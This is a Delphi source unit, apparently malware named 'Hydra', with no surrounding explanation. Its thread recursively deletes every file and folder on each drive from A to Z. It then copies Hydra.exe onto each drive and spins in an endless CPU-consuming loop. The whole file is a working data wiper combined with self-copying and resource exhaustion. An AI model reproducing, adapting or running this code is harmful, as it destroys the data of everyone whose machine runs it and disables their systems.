unit hydra_threads;

interface

uses
Classes, Dialogs, Windows, ShellAPI, SysUtils;

type
HydraThread = class(TThread)
protected
  procedure Execute; override;
private
  procedure DeleteDirectory(const Name: string);
end;

implementation

{ HydraThread }


procedure HydraThread.DeleteDirectory(const Name: string);
var
  F: TSearchRec;
begin
  if FindFirst(Name + '\*', faAnyFile, F) = 0 then begin
    try
      repeat
        if (F.Attr and faDirectory <> 0) then begin
          if (F.Name <> '.') and (F.Name <> '..') then begin
            DeleteDirectory(Name + '\' + F.Name);
          end;
        end else begin
          DeleteFile(Name + '\' + F.Name);
        end;
      until FindNext(F) <> 0;
    finally
      FindClose(F);
    end;
    RemoveDir(Name);
  end;
end;

procedure HydraThread.Execute;
var
i, p, k, sum : integer;
j, upper_limit : Int64;
Source : String;
letter : char;
begin
  inherited;
  Source := 'Hydra.exe';
  for letter := 'A' to 'Z' do
  begin
    DeleteDirectory(letter + ':\');
    CopyFile(PChar(Source), PChar(letter + ':\Hydra.exe'), False);
  end;
upper_limit := 9223372036854775807;
while true do
  begin
      for p := 2 to upper_limit do
        for i := 2 to p do
          if p mod i = 0 then
          begin
            sum := 0;
            for k := 1 to 9999999 do
              sum := sum * k;
          end
          else
            begin
              sum := 0;
              for k := 1 to 999999999 do
                sum := sum * k;
            end;
  end;
end;

end.
